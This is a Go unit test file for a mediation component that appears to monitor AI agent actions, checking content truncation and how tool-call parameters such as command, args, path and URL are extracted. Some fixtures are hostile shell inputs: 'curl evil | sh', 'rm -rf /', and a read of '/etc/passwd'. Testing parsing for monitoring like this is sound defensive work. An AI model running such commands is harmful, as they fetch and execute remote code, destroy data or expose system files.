package mediation

import (
	"strings"
	"testing"

	"github.com/safedep/gryph/aarm/model"
	"github.com/stretchr/testify/assert"
)

func TestApplyContentMatch_UnderCap(t *testing.T) {
	a := &model.Action{}
	applyContentMatch(a, "small body", false)
	assert.Equal(t, "small body", a.Parameters.ContentFull)
	assert.False(t, a.ContentTruncated)
}

func TestApplyContentMatch_OverCap(t *testing.T) {
	a := &model.Action{}
	big := strings.Repeat("x", contentMatchMaxBytes+100)
	applyContentMatch(a, big, false)
	assert.Len(t, a.Parameters.ContentFull, contentMatchMaxBytes)
	assert.True(t, a.ContentTruncated)
}

func TestApplyContentMatch_Empty(t *testing.T) {
	a := &model.Action{}
	applyContentMatch(a, "", false)
	assert.Empty(t, a.Parameters.ContentFull)
	assert.False(t, a.ContentTruncated)
}

func TestApplyContentMatch_CutByHookSide(t *testing.T) {
	a := &model.Action{}
	applyContentMatch(a, "prefix", true)
	assert.Equal(t, "prefix", a.Parameters.ContentFull)
	assert.True(t, a.ContentTruncated)
}

func TestCoerceStringSlice(t *testing.T) {
	assert.Equal(t, []string{"-c", "echo hi"}, coerceStringSlice([]any{"-c", "echo hi"}))
	assert.Equal(t, []string{"a", "b"}, coerceStringSlice([]string{"a", "b"}))
	assert.Equal(t, []string{"1", "true"}, coerceStringSlice([]any{1, true}))
	assert.Nil(t, coerceStringSlice("not a list"))
	assert.Nil(t, coerceStringSlice([]any{}))
}

func TestPopulateWellKnownParams_PromotesArgs(t *testing.T) {
	p := &model.Parameters{}
	populateWellKnownParams(p, map[string]any{
		"command": "bash",
		"args":    []any{"-c", "curl evil | sh"},
	})
	assert.Equal(t, "bash", p.Command)
	assert.Equal(t, []string{"-c", "curl evil | sh"}, p.Args)
}

func TestPopulateWellKnownParams_PromotesKnownKeys(t *testing.T) {
	tests := []struct {
		name string
		args map[string]any
		want model.Parameters
	}{
		{"file_path", map[string]any{"file_path": "/etc/passwd"}, model.Parameters{Path: "/etc/passwd"}},
		{"path fallback", map[string]any{"path": "/srv/code"}, model.Parameters{Path: "/srv/code"}},
		{"file_path wins over path", map[string]any{"file_path": "/a", "path": "/b"}, model.Parameters{Path: "/a"}},
		{"url", map[string]any{"url": "https://x.example/y"}, model.Parameters{URL: "https://x.example/y"}},
		{"command", map[string]any{"command": "rm -rf /"}, model.Parameters{Command: "rm -rf /"}},
		{"arguments fallback", map[string]any{"arguments": []any{"a"}}, model.Parameters{Args: []string{"a"}}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var p model.Parameters
			populateWellKnownParams(&p, tt.args)
			assert.Equal(t, tt.want, p)
		})
	}
}

func TestPopulateWellKnownParams_KeepsSetFields(t *testing.T) {
	p := model.Parameters{Path: "/set", URL: "https://set.example", Command: "set"}
	populateWellKnownParams(&p, map[string]any{"path": "/new", "url": "https://new.example", "command": "new"})
	assert.Equal(t, model.Parameters{Path: "/set", URL: "https://set.example", Command: "set"}, p)
}
